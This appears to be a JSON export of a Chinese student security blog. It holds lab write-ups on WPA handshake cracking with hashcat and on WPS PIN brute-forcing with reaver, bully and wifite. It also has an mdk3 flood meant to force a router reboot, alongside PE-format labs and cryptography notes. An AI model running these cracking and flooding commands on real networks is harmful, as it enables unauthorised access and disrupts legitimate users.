使用–verify选项校验数据，以验证数据库的状态正常。也可以使用–clean选项进行数据清理。 1airolib-ng gryffinbit --verify 可以使用下面的命令行插入单个ESSID。插入单个密码也可类似操作。 1echo Love | airolib-ng gryffinbit --import essid - hashcat工具​ hashcat一款强大的开源密码恢复工具。该工具可以利用CPU或GPU资源，破解多种hash类型的密码。当捕获握手包以后，可以使用该工具快速的破解出WPA密码。使用hashcat工具破解WPA的语法格式如下： 1hashcat -m 2500 [pcap file ] [words] --force 选项 说明 -m 指定使用的hash类型,与WPA相关的hash如下图。 Words 指定要使用的字典。 –force 忽略警告信息。 hashcat –help 查看帮助文档。 1.使用aircrack-ng将捕获的握手包文件转换为hccapx格式。 1aircrack-ng test-01.cap -j hashcattest 2.使用hashcat工具进行破解。 1hashcat -m 2500 hashcattest.hccapx /root/password.txt --force","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"无线网络安全","slug":"实验/无线网络安全","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"WPA","slug":"WPA","permalink":"https://gryffinbit.top/tags/WPA/"}],"author":"Gryffinbit"},{"title":"PE文件导出表","slug":"PE文件导出表","date":"2021-05-21T16:11:20.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2021/05/22/PE文件导出表/","permalink":"https://gryffinbit.top/2021/05/22/PE%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E8%A1%A8/","excerpt":"","text":"参考教材https://gryffinbit.lanzoui.com/iC3shpbqocd 实验内容1、参考教材P83-P86，在VC2010下创建一个名字为“dlltest”的空DLL工程，该工程以如下源文件dlltest.c为基础，产生一个dlltest.dll文件。 12345678910111213141516171819202122232425262728293031 \\#include &lt;Windows.h&gt;void Func1()&#123;MessageBox(NULL, L&quot;Func_1&quot;, NULL, MB_OK);&#125;void Func2()&#123;MessageBox(NULL, L&quot;Func_2&quot;, NULL, MB_OK);&#125;void Func3()&#123;MessageBox(NULL, L&quot;Func_3&quot;, NULL, MB_OK);&#125;void Func4()&#123;MessageBox(NULL, L&quot;Func_4&quot;, NULL, MB_OK);&#125;void Func5()&#123;MessageBox(NULL, L&quot;Func_5&quot;, NULL, MB_OK);&#125; 2、编写dlltest.def文本文件，内容如下： 1234567891011LIBRARY dlltestEXPORTSFunc1 @ 3Func2 @ 5Func3 @ 6 NONAMEFunc5 将dlltest.def文件放在上述DLL工程中与dlltest.c源文件相同的目录下，并按照教材P84，进行DLL构建设置。 3、创建上述DLL的测试工程dllclient，该工程以如下源文件dllclient.c为基础。 1234567891011121314151617181920212223#include &lt;Windows.h&gt;typedef void(*Func)();int main() &#123;Func Func1, Func2, Func3, Func5;HMODULE hMod=LoadLibrary(L&quot;dlltest.dll&quot;); // 显式调用Func1=(Func)GetProcAddress(hMod, &quot;Func1&quot;); Func1();Func2=(Func)GetProcAddress(hMod, &quot;Func2&quot;); Func2();Func3=(Func)GetProcAddress(hMod, (LPCSTR) 6); Func3();Func5=(Func)GetProcAddress(hMod, &quot;Func5&quot;); Func5();FreeLibrary(hMod);return 0;&#125; 注意，执行dllclient工程前，需要将之前编译好的dlltest.dll文件放在dllclient.exe文件所在目录下。 4、按P87-P95的内容，分析该dlltest.dll文件的导出表IMAGE_EXPORT_DIRECTORY结构体中如下几个字段。 12345678910111213(1) DWORD Name(2) DWORD Base(3) DWORD NumberOfFunctions (4) DWORD NumberOfNames(5) DWORD AddressOfFunctions(6) DWORD AddressOfNames(7) DWORD AddressOfnameOrdinals 实验要求1、运行dllclient工程，了解DLL的工作方式。 2、使用C32asm与LordPE两个工具对dlltest.dll文件进行分析。（010editor更好用） 3、要求对导出表上述字段的值逐一在C32asm工具中分别截图，然后对照截图，对导出表字段，在实验结果中用表格进行说明。 4、对上述各个字段的含义进行准确理解。 实验结果请在此处按照实验要求进行截图，并逐一在其后通过表格对导出表结构中各个结构体内部字段值进行记录： 地址 值（内存映像） 字段名 A81C h 1B85A h DWORD Name A820 h 3 DWORD Base A824 h 4 DWORD NumberOfFunctions A828 h 3 DWORD NumberOfNames A82C h 1B838 h DWORD AddressOfFunctions A830 h 1B848 h DWORD AddressOfNames A834 h 1B854 h DWORD AddressOfNameOrdinals","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"PE文件结构分析","slug":"PE文件结构分析","date":"2021-05-14T08:52:41.000Z","updated":"2024-11-12T06:59:24.000Z","comments":true,"path":"2021/05/14/PE文件结构分析/","permalink":"https://gryffinbit.top/2021/05/14/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/","excerpt":"","text":"教材参考实验原理请参考教材。附上该部分教材的PDF下载链接 https://gryffinbit.lanzoui.com/iUvfRpbfjlg 实验目的通过对Win32平台下PE文件结构的分析，熟练掌握PE文件结构中各主要组成部分的构成，以及文件偏移FOA与内存相对虚拟地址RVA之间的转换。 实验内容 、在Win10下编译如下汇编源程序pedemo.asm，编译后的PE文件命名为pedemo.exe; 文件名: pedemo.asm 12345678910111213141516171819.386.model flat, stdcalloption casemap:noneinclude windows.incinclude kernel32.incinclude user32.incincludelib kernel32.libincludelib user32.lib.data? data db 1000h dup (?) ; 未初始化数据.data szText db &#x27;Test&#x27;, 0 ; 5字节数据.codestart: invoke MessageBox, NULL, offset szText, NULL, MB_OK mov data, 1 invoke ExitProcess, NULLend start 分析pedemo.exe文件中如下几部分内容： 参考教材P70～84 (1) DOS头部 (2) PE标识 (3) IMAGE_FILE_HEADER (4) IMAGE_OPTIONAL_HEADER (5) IMAGE_DATA_DIRECTORY中与IMAGE_IMPORT_DESCRIPTOR有关部分 (6) IMAGE_SECTION_HEADER (7) IMAGE_IMPORT_DESCRIPTOR（INT、IAT） 实验要求1、使用C32asm与LordPE两个工具对pedemo.exe文件进行分析。 ​ （可以使用010editor进行分析） 2、要求对PE文件各个部分的字段的值逐一进行说明，其中DOS头部仅需要说明e_magic和e_lfanew两个字段。此外，要求在C32asm工具中对PE文件相关部分分别截图，然后对照截图，对PE结构体中的字段，在实验结果中用表格进行说明。 实验结果请在此处按照实验要求进行截图，并逐一在其后通过表格对PE结构中各个结构体内部字段值进行记录，例如： 1. IMAGE_DOS_HEADER 地址 值（内存映像） 字段名 00000000 4D5A e_magic 0000003C B0000000 e_lfanew 2. IMAGE_FILE_HEADER 地址 值（内存映像） 字段名 000000B4 4C01 Machine 000000C6 0F01 Characteristics 3. IMAGE_OPTIONAL_HEADER 地址 值（内存映像） 字段名 000000C8 0B01 Magic 000001A6 0000 Size 4. IMAGE_DATA_DIRECTORY中与IMAGE_IMPORT_DESCRIPTOR有关部分 地址 值（内存映像） 字段名 00000128 0000 VirtualAddress 000001A6 0000 Size 5. IMAGE_SECTION_HEADER 地址 值（内存映像） 字段名 000001A8 2E746578 74000000 .text 00001D8h 146 VirtualSize 000001E0 200H SizeofRawdata 000001E4 600H PointerToRaeData 6. IMAGE_IMPORT_DESCRIPTOR 地址 值（内存映像） 字段名 00000610 Kernel32.dll Kernel32.dll 00000614 0 TimeDateStamp 00000618 0 ForwarderChain 0000061C 206A Name 00000620 2000 firstThunk","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"C语言程序中函数调用的分析","slug":"C语言程序中函数调用的分析","date":"2021-05-14T08:25:58.000Z","updated":"2024-11-12T06:59:50.000Z","comments":true,"path":"2021/05/14/C语言程序中函数调用的分析/","permalink":"https://gryffinbit.top/2021/05/14/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90/","excerpt":"","text":"实验目的通过对Win32平台下C语言程序中函数调用的分析，熟练掌握Win32平台下利于栈帧进行函数参数传递的方式，以及函数调用与返回过程。 实验内容123456789101112131415161718#include &quot;stdio.h&quot;long add(long *a, long *b)&#123;long *x, *y;x= a, y = b; return (*x + *y);&#125;int main(int argc, char* argv[])&#123; long a = 1, b = 2; printf(&quot;%d\\n&quot;, add(&amp;a, &amp;b)); return 0;&#125; 实验要求 在VC2010中，使用release模式编译上述源程序。 在Win10下使用Ollydbg软件对编译后的执行程序进行动态跟踪调试。 记录main()函数和add()函数被调用时栈帧的产生，以及调用结束后栈帧的撤销过 实验结果请在此处绘制本实验的栈帧产生与撤销过程，并且必须以字节为单位，标注OD中的真实地址、地址中相应存放的16进制数，以及标注EBP、ESP的值。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"逆向","slug":"实验/逆向","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[],"author":"Gryffinbit"},{"title":"帮你决定吃什么","slug":"帮你决定吃什么","date":"2021-05-12T10:21:53.000Z","updated":"2024-11-12T07:00:22.000Z","comments":true,"path":"2021/05/12/帮你决定吃什么/","permalink":"https://gryffinbit.top/2021/05/12/%E5%B8%AE%E4%BD%A0%E5%86%B3%E5%AE%9A%E5%90%83%E4%BB%80%E4%B9%88/","excerpt":"","text":"每到饭点，又到了世纪难题“一会吃什么？”于是用C写了这个简单的小代码来解决这个世纪难题。 代码https://github.com/Gryffinbit/What_To_Eat 设计思路 typedef 一个结构体Food，数据元素为菜的ID，菜名，这道菜所处区域。 void iterm()需要有一个菜单导入的功能，把可供选择的菜放进去。 用到了fopen fscanf fclose函数来读取文件。导入的菜单，格式要求，用空格来隔开三个元素。读取成功后，将内容分门别类的存入到结构体每个元素的数组中 void classify 选择去哪吃，以便后续根据选择的地点，来筛选出符合所在地附近的菜。 void avaliable()决定了去哪里吃之后，筛选出菜单中符合条件的地方 用到了strcmp来对比两个数组中的内容是否一致。输入的位置和菜单中某些菜的位置一致，则将符合条件菜的ID存入avali_i[ ]符合条件数组。av_num是符合条件菜的数量。 void generate(void) 随机数生成，让生成的随机数来决定吃什么 void convert() 将生成的随机数，与菜名的ID相对应上，显示结果的时候，就只显示菜名 结果展示 代码框架12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;typedef struct Foods &#123; int id; char name[100]; char area[30]; //“吃什么”时的所在地&#125; Food;Food food[100];int g_i = 0; //从文件中读入的数据，存入数组int num; //char location[30]; //去哪吃int avali_i[50] = &#123;-1&#125;; //符合去哪吃条件的，将菜名ID存入数组int av_num = 0; //符合条件的菜的数量void iterm() &#123; //读入菜单，并存入数组以备后面使用 FILE* menu = fopen(&quot;/Users/gryffinbit/vscode_project/生成食物/menu.txt&quot;, &quot;r&quot;); .... fclose(menu);&#125;void classify() &#123; //选择去哪里吃 .... scanf(&quot;%s&quot;, location);&#125;void avaliable() &#123;//决定了去哪里吃之后，筛选出菜单中符合条件的地方 ...&#125;void generate(void) &#123; //随机数生成 ...&#125;void convert() &#123; //将生成的随机数，与菜名的ID相对应上 .... printf(&quot;那就去吃 ❣️ %s ❣️ 吧！\\n&quot;, food[g_i].name);&#125;int main() &#123; char confirm; iterm(); printf(&quot;去哪吃呢？%s&quot;, location); printf(&quot;可以选择的地方：芙蓉食堂附近，后街附近，网安院附近，香樟，东苑\\n&quot;); scanf(&quot;%s&quot;, location); avaliable(); while(1)&#123; generate(); convert(); printf(&quot;要不要吃这个菜呢？再来一次吗？[Y/N] &quot;); scanf(&quot;%s&quot;,&amp;confirm); printf(&quot;----------------------💙------------------------\\n&quot;); if(confirm==&#x27;N&#x27;) break; &#125; return 0;&#125; 控诉权哥写完代码，功能实现有点小bug，于是就扔给权哥调试了。当时写的时候，很碎片化，思路也乱七八糟，想到哪里加哪里，于是变量名，全局变量都定义的乱七八糟的。看着他调试的时候，我对着代码随口来了句，什么狗屎代码。 于是他说：“是啊，谁写的啊，哦，我明白了。狗拉的代码，就叫狗屎代码。” 。。。。。。。阿呸，每日思考，这样的人，为什么会有女朋友啊。","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"C","slug":"C","permalink":"https://gryffinbit.top/tags/C/"}],"author":"Gryffinbit"},{"title":"【考试原卷】密码学、计组等","slug":"【考试原卷】密码学、计组等","date":"2021-05-12T08:57:40.000Z","updated":"2024-11-12T07:00:23.000Z","comments":true,"path":"2021/05/12/【考试原卷】密码学、计组等/","permalink":"https://gryffinbit.top/2021/05/12/%E3%80%90%E8%80%83%E8%AF%95%E5%8E%9F%E5%8D%B7%E3%80%91%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%81%E8%AE%A1%E7%BB%84%E7%AD%89/","excerpt":"","text":"不会吧不会吧，真的有人相信会有考试原卷吗？ 醒醒吧！","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"密码学考试计算类题型","slug":"密码学考试计算类题型","date":"2021-05-10T16:34:55.000Z","updated":"2024-11-12T07:00:11.000Z","comments":true,"path":"2021/05/11/密码学考试计算类题型/","permalink":"https://gryffinbit.top/2021/05/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%80%83%E8%AF%95%E8%AE%A1%E7%AE%97%E7%B1%BB%E9%A2%98%E5%9E%8B/","excerpt":"","text":"","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"密码学考点","slug":"密码学考点","date":"2021-05-10T15:25:36.000Z","updated":"2024-11-12T07:00:12.000Z","comments":true,"path":"2021/05/10/密码学考点/","permalink":"https://gryffinbit.top/2021/05/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%80%83%E7%82%B9/","excerpt":"","text":"考点第一章 ✅由密钥K和当前状态西格玛，组成函数f（k，西格玛），来产生一个密钥流。（与明文、密文都无关。） 认证业务：在单向通信的情况下，认证业务的功能是使接收者相信消息确实是由它自己所声称的那个信源发出的 保密通信系统模型：双密钥体制下，接收方由本地密钥发生器获取解密密钥 从安全性上，几类算法的强度排序：抗唯密文攻击算法&lt;抗已知明文攻击算法&lt;抗选择明文攻击算法&lt;抗选择密文攻击算法 保密系统对信息保密需要满足 1.抗密码分析，敌手决定密钥或任意明文在计算上不可行 2.依赖于密钥，不依赖算法 3.加密和解密算法适用于密钥空间所有元素 系统便于实现和使用。 密码系统基本要素 1.明文 2.密文 3.加密 4.解密 5.加密算法、解密算法 6.密钥。 密钥是体制安全保密的关键 密码分析学 从密文分析出：明文、密钥、解密算法 对称密码体制： 本质上，加密与解密密钥相同，但是形式上，可以不是完全一样的密钥 代换密码、置换密码区别： 代换密码要先建立一个替换表（即密钥），加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文。 置换密码是对明文字符按某种规律进行位置的置换。 棋盘密码、凯撒密码、维吉尼亚密码都是代换密码。 天书密码是置换密码。 第一个商用级别密码标准是DES 第二章 ⍻1.理解流密码的概念、密钥流的伪随机性和生成器的结构。流密码运行方式。 2.理解m-序列基本概念和特点。m-序列周期 密钥流生成器的驱动 1.为了抗密码分析，所以要求函数设计是非线性的。但是状态函数的输入，非线性的难以操作实现。于是由两部分组成。线性的状态输入+非线性的密钥输出。所以整体还是非线性的。 2.极大周期、良好的统计特性、抗线性分析、抗统计分析 加密器 加密器可以分为两部分：密钥流产生器+加密变换器 生成器，流密码的产生 与状态有关，有记忆元件，一个个输出，每次的k要变。 伪随机数 随机性： 一般认为随机序列应有良好的统计特性。分布均匀性：序列中的位分布应是均匀的，即0和1出现的频率大约相等。 独立性： 序列中任何子序列不能由其他子序列推导出。 为什么叫伪随机： 密钥流是周期的（不能做到一次一密，密钥没有那么多），序列不可能做到完全随机。 密码应用大多使用算法来生成随机数。这些算法是确定的，所以产生的序列并非统计随机的。 只能要求截获比周期短的一段时，不会泄露更多信息。 需要满足： 周期要大。截获部分明文和相应密文不能推出整个序列。序列计算容易。 m序列： 0、1出现的概率大致相同，只差一个。（少一个1） 总游程数为2^{n-1} 0、1在序列的每一个位置上出现的概率相同。 破译：已知一个2n长的明文密文对，可以求出2n长的密钥序列。推出线性反馈移位寄存器的n+1个状态 异自相关函数是一个常数，表明平移序列无法或得更多信息 第三章 分组密码 ⍻ 理解数据加密标准DES的设计思想和框架。系统设计基本方法 掌握DES算法的安全性和典型的轮函数结构Feistel。空；S盒参数特质。S盒演示 掌握高级加密标准AES算法轮函数所需的有限域知识。空；空；不可约多项式，位操作快速计算 理解AES轮函数结构和安全性。空；轮函数构成（清楚哪几部分） 设计关键： 关键在于加解密算法，要求明文和密文之间的关联在密钥的控制下，尽可能复杂 1977年，数据加密标准DES在美国批准。它基于美国IBM公司提出的Lucifer 密码，是世界上第一个广泛的商业数据保密算法 DES的轮函数将32比特的R{i-1}输入，经过扩展置换变成48比特，才与轮密钥Ki 异或。而后需要经过S盒代换，变成32比特，再进程一次P置换。 AES算法为抵抗线性密码分析和差分密码分析，设计的轮函数分为：线性混合层（高度扩散）、非线性混合层（S盒）、密钥加层（子密钥和状态异或） AES，行移位中，第0行不移位。其他行根据不同状态，不同分组数Nb，位移量不同 AES，列混淆中。状态阵列的每个列视为GF（2^8）上的多项式，再与固定多项式c（X）进行模x^4 +1乘法。c(x)是模x^4 +1可逆的多项式（可约多项式）。所以列混合是可逆的 扩展密钥，看作是以字（4字节）为元素的一维数组 第四章 公钥密码学 ⍻ 理解公钥密码的体制和基本概念。组成上特点。功能上区别。 掌握剩余系的基本概念、费马定理和欧拉定理 掌握RSA加密算法和预处理计算。空；空；空；计算 理解RSA算法基于大整数难分解的安全性。空、困难问题、安全性 掌握ElGamal加密算法和基于离散对数求解困难性的安全性。空；组成，困难问题，安全性。空；计算，随机数隐患。 了解实数域上椭圆曲线性质。空；运算的代数与几何表示 介绍有限域上的椭圆曲线和基于椭圆曲线的公钥密码体制。空。基本原理 计算上不可行即表示一个程序是可处理的但是需要一个长得不切实际的时间(如几十亿年)来处理的步骤。并不是计算起来复杂性很高。 相比单密钥体制，公钥密码体制还可以解决密钥分配和数字签名问题 安全SSL的数字证书RSA公钥长度已达2048比特 低指数攻击，e很小，可以开方来计算。但是，必须要模较大的时候才可以，如果太小，不能开，无法计算出来 群运算一定满足结合律，不一定满足交换律 第五章 消息认证码与哈希函数 ⍻ 理解MAC和Hash函数的定义以及能解决的安全需求。基本特征。MAC的基本原理。 理解哈希函数的生日攻击。空；哈希的安全设计目标。生日攻击原理。 理解HMAC算法原理和设计结构。空；安全设计要求 掌握MD5算法和安全Hash算法原理的结构。SHA-1参数特征。MD5安全性 消息认证码是针对明文的，可以认证明文，不是针对密文产生的，所以不能认证密文。 MD5输入长度没有限制，SHA-1长度不超过2^64 位。（是长度，不是转换为二进制后的数值） MD5：缓冲区4个字，进行4轮处理。输入3个32比特的字，输出1个字。小端方式存储 SHA-1：缓冲区5个字，进行4轮处理。输入3个32比特的字，输出1个字。更新之后还是五个字。大端方式存储 MD5存储按照小端方式，而SHA-1按照大端方式。理论上，SHA-1找寻相同哈希值的碰撞消息计算复杂度，大概2的80次方。 第六章 数字签名 ⍻ 掌握数字签名的基本概念和特点。本质特征。基本算法结构。 掌握RSA数字签名体制。是否是概率性的。空；空；计算，验证过程 数字签名的密钥生成、签名是概率性算法（随机化算法生成vk、sk。签名随机化算法生成signsk（m）&#x3D;西格玛，作为签名）验证是确定性算法 RSA签名是一种确定性签名。如果用消息填充的方式进行随机化，本质上是对消息的随机化。 RSA签名，不再存在共模攻击和低指数攻击。 第七章 密码协议 掌握diffie-Hellman密钥交换及中间人攻击。攻击的类型；空；空；原理、补丁 理解Kerberos第三方认证系统原理。系统目标。可重用性特点 第八章 可证明安全 主要介绍Boneh-Franklin基于身份加密算法及其安全性证明思路。空；特点 第九章 密码学新方向 典型加密算法的半同态性和全同态性。空；经典算法的半同态性 理解后量子密码算法抵抗量子计算攻击的原理。空；经典算法安全性和新算法特点。 例题 xtime算法理论基础： C(x)&#x3D;A(x)B(x) mod P(x) 二进制数转换为多项式:A(a7,a6,a5,a4,a3,a2,a1,a0)&#x3D;&#x3D;&gt;A(X)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0，GF(28)内的最大值为(11111111)2&#x3D;&#x3D;&gt; x7+x6+x5+x4+x3+x2+x+1，P(x)&#x3D;x8+x4+x3+x2+x+1&#x3D;&#x3D;&gt;(100011011)2&#x3D;0x11B X8 mod P(x)&#x3D; x4+x3+x2+x+1——————x8除以P(x)的余数 异或运算：0⊕0&#x3D;0, 0⊕1&#x3D;1, 1⊕1&#x3D;0 有限域GF(2n)加法：C(x)&#x3D;A(x)+B(x)&#x3D;∑cixi(0≤i≤m-1)，ci&#x3D;ai+bi mod 2即ai⊕bi，A(x)&#x3D;(am-1,…,a3,a2,a1,a0)2，B(x)&#x3D;(bm-1,…,b3,b2,b1,b0)2 定义xtime()运算：设A(x)∈GF(28),A(x)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0对应的二进制数为(a7,a6,a5,a4,a3,a2,a1,a0)则xtime(A(x))&#x3D;xA(x)&#x3D; a7x8+a6x7+a5x6+a4x5+a3x4+a2x3+a1x2+a0x对应的二进制数为(a7,a6,a5,a4,a3,a2,a1,a0,0)。将A(x)左移一位(最低位补0，原先的最高位删除)的结果为(a6,a5,a4,a3,a2,a1,a0,0)，如果a7&#x3D;0，则A(x)左移一位的结果就是xtime(A(x))的值；如果a7&#x3D;1,则A(x)左移一位的结果与0x1B逐比特异或(异或运算符⊕)即为xtime(A(x))的值。(a7&#x3D;1时，x*A(x)的值超出GF(28)，需要 模P(x),结果为A(x) 左移一位的结果为(a6,a5,a4,a3,a2,a1,a0,0)与0x1B逐比特异或的值) 例题： 例题1： 设0x64∈GF(28)，求xtime(0x64)的值？ 0x64转换为二进制数为(0110 0100)2，最高位a7&#x3D;0,所以0x64左移一位的结果就是所求值，(0110 0100)2左移一位后的值为(110 01000)2 例题2： 在GF(28)中计算0x570x13的结果？ 先将166进制数转换为二进制数：0x57&#x3D;(0101 0111)2,0x13&#x3D;(0001 0011)2 将二进制数转换为多项式：0x13&#x3D;x4+x+1 0x570x13&#x3D;0x57*(x4+x+1)&#x3D;0x57x4+0x57x+0x57 0x57x就是xtime(0x57)&#x3D;(1010 1110)2 0x57x2就是xtime(0x57x)&#x3D;(0101 1100)+(0001 1011)&#x3D;(0100 0111)2 同理0x57x3&#x3D;(10001110)2,，0x57x4&#x3D;(0000 0111)2 所以0x570x13&#x3D;(00000111)2+(1010 1110)2+(0101 0111)2","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"WIFI密码破解之WPS加密","slug":"WIFI密码破解之WPS加密","date":"2021-05-05T12:54:21.000Z","updated":"2024-11-12T06:59:02.000Z","comments":true,"path":"2021/05/05/WIFI密码破解之WPS加密/","permalink":"https://gryffinbit.top/2021/05/05/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWPS%E5%8A%A0%E5%AF%86/","excerpt":"","text":"​ 实验原理：WPS（Wi-Fi Protected Setup）是由Wi-Fi联盟组织实施的可选认证项目，主要是为了简化无线局域网安全及安全性能的配置工作。用户只需要简单按下路由器上的WPS按钮或者输入PIN码，即可快速连接到Wi-Fi网络。​ WPS PIN码共8位，其中第8位是校验和，所以只需计算出前7位即可。在实施PIN破解时，可以分别判断PIN的前四位和后三位是否正确。因此，PIN码只有10^4+10^3&#x3D;11000种变化。​ 那么在实际破解尝试中，最多只需试验11000次，平均只需试验5500次就能破解。 reaver1. 开启无线网卡的监听模式 1airmon-ng start wlan0 2.使用wash工具扫描开启WPS的AP 1wash -i wlan0mon 选项 说明 BSSID AP 的MAC地址 Ch AP的工作信道 dBm 接收的信号强度 WPS WPS的版本 Lck WPS是否锁定 Vendor 生成厂商 ESSID AP的SSID 查看有WPS功能的AP 1airodump-ng --wps wlan0mon 3. 使用reaver工具进行破解 Reaver是一款暴力破解PIN码的工具，将尝试一系列的PIN码，直到破解出正确的PIN码，而且还可以恢复出WPA&#x2F;WPA2密码。其语法格式如下： 1reaver -i [interface] -b [ap的mac地址] 可以使用reaver --help查看帮助文档。 参数说明： 选项 说明 -i 指定监听的无线接口 -b 指定目标AP的mac地址 -S 使用最小的DH key，可以提高破解速度 -v ; -vv ; -q 显示非严重警告 ; 显示更多， 相对应的 ; 只显示关键信息 -d 即delay每穷举一次的闲置时间，预设为1秒 -c 信道号码 -p 使用指定PIN码的四位或八位开始破解。 1reaver -i wlan0mon -b 18:D9:8F:66:CD:7C -v -S 以“kong”作为攻击目标 使用指定PIN码进行破解，以“Netsec109_2”作为攻击目标 1reaver -i wlan0mon -b 64:09:80:17:ED:2F -p 1234 -vv -S wifite​ wifite是一款自动化WEP、WPA和 WPS破解工具。用于破解WPS加密的语法格式如下： 1wifite --wps --wps-only --bully 选项 说明 –wps 仅显示启用WPS功能的无线网络。 –wps-only 仅实施WPS PIN和Pixie-Dust攻击。 –bully 使用bully程序实施WPS PIN和Pixie-Dust攻击。 –ignore-locks 当AP锁定后，继续WPS PIN攻击。 1wifite --wps --wps-only --bully --ignore-locks 选择一个想要攻击的编号 BullyBully也是一款利用路由器的WPS漏洞来破解WIFI的工具。其语法格式如下： 1bully --bssid [AP的MAC地址] -c [channel] [interface] -vv 选项 说明 interface 指定监听的无线接口。 -b，–bssid 指定目标AP的MAC地址。 -c，–channel 指定目标AP工作的信道。 -vv 显示更详细的信息。 1bully --bssid 18:D9:8F:66:CD:7C wlan0mon -c 11 以“kong”作为攻击目标 防止锁PIN​ 目前，大部分路由器都自带防PIN功能。当穷举PIN码暴力破解时，连续使用超过特定次数的PIN码后，路由器会暂时锁定WPS功能一段时间。这种情况，需要耐心等待其恢复WPS功能。也可以使用mdk3发起洪水攻击，使得路由器合法用户无法使用网络，从而迫使路由器主人重启路由器，即可解除PIN锁。​ AP认证洪水攻击，就是向AP发送大量虚假的连接请求。当发送的请求超过AP所能承受的范围时，AP就会自动断开现有连接，使得合法用户无法使用网络。其语法格式如下： 1mdk3 &lt;interface&gt; a &lt;test_options&gt; 选项 说明 interface 指定用于攻击的网络接口，需是监听模式的接口。 a 实施身份验证洪水攻击模式。 -a 指定要攻击的目标AP的MAC地址。 1mdk3 wlan0mon a -a 18:D9:8F:66:CD:7C 使用airodump-ng监测，可以看到界面下方瞬间出现了大量的伪造客户端，且连接的目标AP均为”18:D9:8F:66:CD:7C”。 1airodump-ng wlan0mon -c 11 --bssid 18:D9:8F:66:CD:7C","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"物联网","slug":"实验/物联网","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%89%A9%E8%81%94%E7%BD%91/"}],"tags":[{"name":"WPS","slug":"WPS","permalink":"https://gryffinbit.top/tags/WPS/"}],"author":"Gryffinbit"},{"title":"WPA握手包破解原理","slug":"WPA握手包破解原理","date":"2021-05-05T12:54:00.000Z","updated":"2024-11-12T06:58:46.000Z","comments":true,"path":"2021/05/05/WPA握手包破解原理/","permalink":"https://gryffinbit.top/2021/05/05/WPA%E6%8F%A1%E6%89%8B%E5%8C%85%E7%A0%B4%E8%A7%A3%E5%8E%9F%E7%90%86/","excerpt":"","text":"​ 实验原理：WPA密码其实叫PSK（pre-shared key），它加上ssid通过一定的算法可以得到PMK（pairwise master key）: ​ $$ PMK&#x3D;SHA_1(ssid,psk) $$​ PMK的长度是定长的，都是64字节。由于计算PMK的过程开销比较大，是我们破解花费时间长的关键，所以采用以空间换时间的原则把PMK事先生成好，这个事先生成好的表就是常说的HASH表，这个工作就是用airlib-ng这个工具来完成。​ 目前的破解方法是我们获得握手包后，用我们字典中的PSK+ssid生成PMK，然后结合握手包中的（客户端MAC，AP的BSSID，$A_NONCE$，$S_NONCE$）计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。 airolib-ng​ airolib-ng是Aircrack-ng套装里的又一个工具，用来存储和处理网络名和密码表。通过计算PMK，用于WPA&#x2F;WPA2的破解。其语法格式如下： 1airolib &lt;database&gt; &lt;operation&gt; [options] 选项 说明 database 